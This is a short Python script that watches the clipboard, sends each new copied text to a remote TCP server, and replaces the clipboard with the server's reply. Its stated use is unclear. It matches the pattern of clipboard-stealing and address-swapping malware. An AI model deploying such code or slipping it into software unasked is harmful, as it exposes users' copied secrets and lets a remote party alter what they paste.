import socket
import time
import pyperclip

HOST = "change this please"  # The server's IP address
PORT = 65432            # The port used by the server

def get_clipboard_data():
    return pyperclip.paste()

def main():
    prev_clipboard_data = get_clipboard_data()
    while True:
        current_clipboard_data = get_clipboard_data()
        if current_clipboard_data != prev_clipboard_data:
            updated_data = send_to_server(current_clipboard_data)
            pyperclip.copy(updated_data)
            prev_clipboard_data = updated_data
        time.sleep(1)  # Check every second

def send_to_server(data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(data.encode('utf-8'))
        received_data = s.recv(1024).decode('utf-8')
        return received_data

if __name__ == '__main__':
    main()
